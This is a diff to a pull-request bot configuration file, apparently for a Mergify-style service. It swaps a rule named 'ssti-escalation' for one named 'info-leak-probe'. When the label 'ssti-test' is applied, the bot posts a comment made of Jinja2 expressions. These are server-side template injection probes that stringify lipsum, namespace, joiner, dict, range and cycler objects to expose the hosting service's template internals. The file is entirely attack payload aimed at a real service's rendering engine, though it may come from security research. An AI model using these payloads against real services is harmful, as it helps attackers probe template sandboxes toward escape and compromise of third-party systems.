@@ -1,11 +1,15 @@
 pull_request_rules:
-  - name: ssti-escalation
+  - name: info-leak-probe
     conditions:
       - label=ssti-test
     actions:
       comment:
         message: |
-          STR_MUL={{'A'*50}}
-          LIPSUM={{lipsum(n=1,html=False)}}
-          RANGE={% for i in range(10) %}{{i}},{% endfor %}
-          CYCLER={{cycler(1,2,3).next()}}
+          LIPSUM_STR={{lipsum|string}}
+          LIPSUM_PPRINT={{lipsum|pprint}}
+          NS={{namespace(x=lipsum)|string}}
+          JOINER={{joiner()|string}}
+          DICT={{dict|string}}
+          DICT_ITEMS={{dict()|items|list}}
+          RANGE_TYPE={{range(1)|string}}
+          CYCLER_STR={{cycler(1)|string}}
